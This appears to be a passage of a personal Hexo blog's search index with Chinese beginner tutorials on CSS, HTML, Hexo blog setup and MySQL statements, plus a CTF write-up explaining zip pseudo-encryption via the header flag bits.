src="http://img-blog.csdnimg.cn/20190331102853541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70">效果如下</p><p><img src="http://img-blog.csdnimg.cn/20190331103330788.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>3.不同类型的选择器：优先级<br>先解析低优先级；<br>div&lt;class&lt;id<br>原理同上 <hr></p><p>4.外部样式 内部样式合并之后再一起解析<br>先外部样式再内部。<br>其他原理同上。<br>5.内联样式：外部和内部解析完之后再解析内联。<br>6.加了important字段的 最后执行。<br><strong>继承原则</strong></p><p>1.文字 文本 样式 可被继承</p><pre><code>       div.txt&#123;        color:red;        &#125;        &lt;body&gt;           &lt;div class=&quot;txt&quot;&gt;          苹果      &lt;p&gt; 香蕉   &lt;/p&gt;      &lt;/div&gt;     &lt;/body&gt;</code></pre><p>其中苹果和香蕉属性相同。</p><p>2.块级元素 宽度不被设置时则会继承父级元素的宽，高由内容决定。<br><strong>组合选择器</strong><br>把基本选择器 通过特殊字符串在一起<br>分组选择器<br>用逗号隔开：div,p 代表两个选择器内容共同<br>嵌套选择器<br>用空格隔开：div p  嵌套在div里的p才能生效<br>子选择器<br>div&gt;p 必须是上一级的div才能生效。<br>相邻选择器；同级别的<br>div+p<br><strong>属性选择器</strong></p><p><img src="http://img-blog.csdnimg.cn/20190331122301403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>css背景</strong><br>CSS 属性定义背景效果:</p><p><em>background-color</em>属性定义了元素的背景颜色.<br><em>background-image</em>属性描述了元素的背景图像.<br>默认情况下，背景图像进行平铺重复显示<br><em>background-repeat</em>：<br>background-repeat:repeat-x;水平方向平铺<br>background-repeat:repeat-y;垂直方向平铺<br>background-repeat:no-repeat;不平铺<br><em>background-attachment</em>：<br>scroll<br>背景图片随页面的其余部分滚动。这是默认<br>fixed<br>背景图像是固定的<br>使用简写属性时，属性值的顺序为：:</p><p>   background-color<br>    background-image<br>    background-repeat<br>    background-attachment<br>    background-position</p><p><strong>css字体</strong><br>font<br>    在一个声明中设置所有的字体属性</p><p>font-family<br>    指定文本的字体系列</p><p>font-size<br>    指定文本的字体大小</p><p>font-style<br>    指定文本的字体样式</p><p>font-variant<br>    以小型大写字体或者正常字体显示文本。</p><p>font-weight<br>    指定字体的粗细。</p><p>   <strong>css链接和列表</strong><br>链接的样式，可以用任何CSS属性（如颜色，字体，背景等）。<br>特别的链接，可以有不同的样式，这取决于他们是什么状态。<br>这四个链接状态是： </p><p>a:link - 正常，未访问过的链接<br>    a:visited - 用户已访问过的链接<br>    a:hover - 当用户鼠标放在链接上时<br>    a:active - 链接被点击的那一刻<br>    <img src="http://img-blog.csdnimg.cn/20190331152838763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>    <strong>css盒子模型</strong><br>    Margin(外边距) - 清除边框外的区域，外边距是透明的。<br>Border(边框) - 围绕在内边距和内容外的边框。<br>Padding(内边距) - 清除内容周围的区域，内边距是透明的。<br>Content(内容) - 盒子的内容，显示文本和图像。</p><pre><code>div &#123;    width: 300px;    border: 25px solid green;    padding: 25px;    margin: 25px;&#125;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190331154327409.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br><strong>css布局</strong><br><img src="http://img-blog.csdnimg.cn/20190331172852392.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">清除浮动在下一个div中添加<br>div{<br>clean :both;<br>}就可以将恢复浮动</p><p><strong>css定位</strong><br>position 属性的五个值：<br>static:HTML 元素的默认值，即没有定位,遵循正常的文档流对象。<br>relative:相对定位元素的定位是相对其正常位置。<br>fixed:元素的位置相对于浏览器窗口是固定位置。<br>即使窗口是滚动的它也不会移动：<br>absolute:绝对定位的元素的位置相对于最近的已定位父元素，如果元素没有已定位的父元素，那么它的位置相对于<html>:<br>sticky:这个有点魔性，就不写了。。。</p>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML练习记录</title>
      <link href="2019/03/30/html%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>2019/03/30/html%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p> <strong>网页基本结构</strong>：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt; 标题&lt;/title&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;/head&gt;&lt;body&gt; hello world!&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190328143835884.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>  <strong>-html 文本</strong><br><img src="http://img-blog.csdnimg.cn/20190328145055305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><p><strong>-HTML 图像</strong><br>HTML 图像是通过标签<code> &lt;img&gt;</code> 来定义的.<br><code>&lt;img&gt; </code>是空标签，意思是说，它只包含属性，并且没有闭合标签。要在页面上显示图像，你需要使用源属性（src）。src 指 “source”。源属性的值是图像的 URL 地址。<br>URL 指存储图像的位置。</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt; 图片&lt;/title&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;img src=&quot;C:\360downloads\wpcache\internetcache\5.jpg&quot;&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190328150212679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br><strong>超文本链接</strong><br>HTML 链接是通过标签<code>&lt;a&gt;</code>  来定义的.</p><p>实例</p><pre><code>&lt;a href=&quot;https://store.steampowered.com/&quot;&gt;这是一个链接&lt;/a&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190328160017517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>1.HTML 链接 - target 属性</p><p>使用 target 属性，你可以定义被链接的文档在何处显示。</p><p>下面的这行会在新窗口打开文档：</p><pre><code>&lt;a href=&quot;https://store.steampowered.com//&quot; target=&quot;_blank&quot;&gt;stream 官网&lt;/a&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190328160116863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>html图片映射</strong></li><li><strong>html列表</strong><br>无序列表使用<code>&lt;ul&gt;</code> 标签<br>有序列表使用<code>&lt;ol&gt;</code>标签</li></ul><pre><code>无序列表  &lt;ul&gt;&lt;li&gt;Coffee&lt;/li&gt;&lt;li&gt;Milk&lt;/li&gt;&lt;/ul&gt;有序列表&lt;ol&gt;&lt;li&gt;Coffee&lt;/li&gt;&lt;li&gt;Milk&lt;/li&gt;&lt;/ol&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190328165051175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>-HTML 表格</strong><br>表格由<code> &lt;table&gt;</code> 标签来定义。每个表格均有若干行（由<code> &lt;tr&gt;</code> 标签定义），每行被分割为若干单元格（由<code> &lt;td&gt;</code> 标签定义）。字母 td 指表格数据（table data），即数据单元格的内容。数据单元格可以包含文本、图片、列表、段落、表单、水平线、表格等。 </p><pre><code>&lt;table border=&quot;1&quot;&gt;    &lt;tr&gt;        &lt;td&gt;row 1, cell 1&lt;/td&gt;        &lt;td&gt;row 1, cell 2&lt;/td&gt;    &lt;/tr&gt;    &lt;tr&gt;        &lt;td&gt;row 2, cell 1&lt;/td&gt;        &lt;td&gt;row 2, cell 2&lt;/td&gt;    &lt;/tr&gt;&lt;/table&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190329151313779.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>    <strong>-HTML 表单和输入</strong><br>    文本域通过<input type="text"> 标签来设定，当用户要在表单中键入字母、数字等内容时，就会用到文本域。<br>表单使用表单标签 <code>&lt;form&gt;</code> 来设置:</p><pre><code>&lt;form&gt;First name: &lt;input type=&quot;text&quot; name=&quot;firstname&quot;&gt;&lt;br&gt;Last name: &lt;input type=&quot;text&quot; name=&quot;lastname&quot;&gt;&lt;/form&gt; </code></pre><p><img src="http://img-blog.csdnimg.cn/20190329151830622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2. 密码字段通过标签<code>&lt;input type=&quot;password&quot;&gt;</code> 来定义:*<br>    密码字段字符不会明文显示，而是以星号或圆点替代</p><pre><code>&lt;form&gt;Password: &lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;&lt;/form&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190329152700653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zip伪加密做法及原理</title>
      <link href="2019/03/25/zip%E4%BC%AA%E5%8A%A0%E5%AF%86%E5%81%9A%E6%B3%95%E5%8F%8A%E5%8E%9F%E7%90%86/"/>
      <url>2019/03/25/zip%E4%BC%AA%E5%8A%A0%E5%AF%86%E5%81%9A%E6%B3%95%E5%8F%8A%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>总结一下伪加密题的解法，首先伪加密是指对zip文件的标志位进行修改，然后达到加密的效果，实际上并没有加密。</p><p> 一个 zip 文件由三个部分组成：</p><blockquote><p>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志 </p></blockquote><p>例：有一个伪加密zip文件，用winhex工具打开查看其十六进制编码，如下<br><img src="https://img-blog.csdnimg.cn/20190325203657619.png" alt="在这里插入图片描述"><br>首先需要了解一下这些16进制数的作用才能知道为什么要这样写，不要为了做题而做题。</p><p><strong>压缩源文件数据区</strong>：<br>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密）<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>00 00：扩展记录长度<br>6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500b</p><p><strong>压缩源文件目录区</strong>：<br>50 4B 01 02：目录中文件文件头标记(0x02014b50)<br>3F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本 </p><pre><code class="css">00 00：全局方式位标记（有无加密，更改这里进行伪加密，改为09 00打开就会提示有密码了）</code></pre><p>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量<br>6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001</p><p><strong>压缩源文件目录结束标志</strong>：<br>50 4B 05 06：目录结束标记<br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>59 00 00 00：目录区尺寸大小<br>3E 00 00 00：目录区对第一张磁盘的偏移量<br>00 00 1A：ZIP 文件注释长度 </p><p>找到 50 4B 01 02<br><img src="https://img-blog.csdnimg.cn/20190325204935609.png" alt="在这里插入图片描述"><br>把 09 改为 00 文件另存为，再打开就无加密了。</p><p><strong>注意</strong>：09 是一个例子，末位为奇数，代表加密，为偶数代表未加密。</p><p><strong>识别真伪加密</strong>：</p><p>无加密：<br>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为00 00</p><p>伪加密：<br>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p><p>真加密：<br>压缩源文件数据区的全局加密应当为09 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 伪加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用hexo搭建blog</title>
      <link href="2019/03/22/%E4%BD%BF%E7%94%A8hexo%20%E6%90%AD%E5%BB%BA%20blog%E8%BF%87%E7%A8%8B/"/>
      <url>2019/03/22/%E4%BD%BF%E7%94%A8hexo%20%E6%90%AD%E5%BB%BA%20blog%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>教你如何一步一步使用hexo搭建blog。</p><a id="more"></a><p> <strong>1.</strong> <strong>第一步安装 Node.js</strong><br><a href="https://nodejs.org/en/"> 下载地址</a><br><img src="http://img-blog.csdnimg.cn/20190320150754855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br> 选择第一个稳定版一路next，不过在Custom Setup这一步记得选<strong>Add to PATH</strong> ,这样你就不用自己去配置电脑上环境变量了，完成后win+r,输入node-v,显示版本号则成功。<img src="http://img-blog.csdnimg.cn/20190317135718944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><strong>2.Git的安装</strong></p><p>在浏览器上搜索git for windows，进入官网，点击Dawnload进行下载。或者点击下面这个网址下载<br><a href="http://npm.taobao.org/mirrors/git-for-windows/v2.21.0.windows.1/">下载地址</a><br>安装步骤：一路next到这个页面</p><p><img src="http://img-blog.csdnimg.cn/20190320154605917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>选择第二个，然后继续一路next。<br><strong>3</strong>.<strong>Hexo的安装</strong><br>先创建文件夹用来存放，创建了一个名为blog的文件夹。进入该文件夹目录，鼠标右击，选择Git Bash Here进入命令行。</p><p><img src="http://img-blog.csdnimg.cn/20190321150616969.png" alt="在这里插入图片描述"><br>开始安装Hexo，安装命令：<br><code>npm install hexo-cli -g</code><br>然后初始化<br>初始化命令：<code>hexo init blog</code><br><strong>4.Github的创建</strong></p><ul><li>注册账号</li><li>初始设置</li><li>验证账号</li></ul><p> <strong>5.Github的配置</strong></p><ul><li>配置github信息</li></ul><pre><code>git config --global user.email &quot;YourEail&quot; git config --global user.name &quot;YourName&quot;将邮箱和用户名都换成自己的。</code></pre><ul><li>生成SSH密钥<br>打开Git Bash Here命令行，输入<code>ssh-keygen -t rsa -C &quot;你的邮箱&quot;</code>然后一直回车到结束，这样就成功在C盘用户个人目录生成了.ssh文件夹。<br>打开文件复制密钥。</li><li>登录你的gihub账号<br>点击Edit profile进入，选择SSH并新建一个SSH Key</li></ul><p><strong>6.config.yml文件的配置</strong><br>打开你的blog项目，修改_config.yml文件的一些配置:<br>url:http://你的账户名.github.io</p><pre><code>deploy:  type: git  repo: https://github.com/你的账户名/你的账户名.github.io.git  branch: master</code></pre><p><strong>7.本地预览和上传到Github</strong><br>在你的blog目录下右键打开git base here<br>执行以下命令</p><p>hexo clean<br>hexo g<br>hexo s<br>打开浏览器输入：<a href="http://localhost:4000/">http://localhost:4000</a> 就可以在本地看到Hexo。<br>hexo g即可上传同步。</p>]]></content>
      
      
      <categories>
          
          <category> Blog搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 语句练习</title>
      <link href="2019/01/27/Mysql%20%E8%AF%AD%E5%8F%A5%E7%BB%83%E4%B9%A0/"/>
      <url>2019/01/27/Mysql%20%E8%AF%AD%E5%8F%A5%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p> 这周来了解一下数据库的知识，使用phpstudy自带的mysql，来练习数据库方面的知识。<hr><br>首先使用phpstudy上的Mysql命令行便可进行数据库的创建，删除，数据表的创建与删除，数据的增删查改。默认密码应该为root。<img src="http://img-blog.csdnimg.cn/20190127114142720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>利用cmd进入phpstudy数据库需进入phpstudy下的bin目录<br><img src="http://img-blog.csdnimg.cn/20190127114532136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><p><strong>下面是一些常用sql语句，具体操作不再展示。</strong></p><p>创建一个数据库<br>create database 数据库名称；<br>删除一个数据库<br>drop database 数据库名称；<br>选择（使用）一个数据库<br>use 数据库名称；<br>在选择好的数据库中建立一个数据表<br>&lt;创建一个表&gt;<br>create table 表名 ( id int ,name varchar(35),password varchar(40));<br>其中 id name password 是字段 ,后面的限制是类型。<br>&lt;删除一个表&gt;<br>drop table 表名；<br>&lt;查看表结构&gt;<br>desc  表名称；<br>&lt;查看建表语句&gt;<br>show create  table 表名称；<br>&lt;查看建库语句&gt;<br>show create database 数据库名称；<br>&lt;修改表字段值&gt;<br>alter table 表名  modify 字段名字 修改字段值；<br>&lt;添加表字段&gt;<br>alter table 表名 add 字段名称+字段类型；<br>&lt;删除表字段&gt;<br>alter table 表名  drop 字段名字；<br>&lt;插入顺序的问题&gt;<br>first<br> alter  table  表名  add  字段名称+类型  first;<br>after<br> alter table 表名 add  字段名称+类型   after+字段名称;<br>&lt;修改表的名字&gt;<br>alter table 原表名 rename 新的名字；<br>&lt;查表&gt;<br>show tables;<br>&lt;查库&gt;<br>show databases;.<br>&lt;修改表字段&gt;<br>alter table 表名  change 原来的字段名称    修改后的字段名称；</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
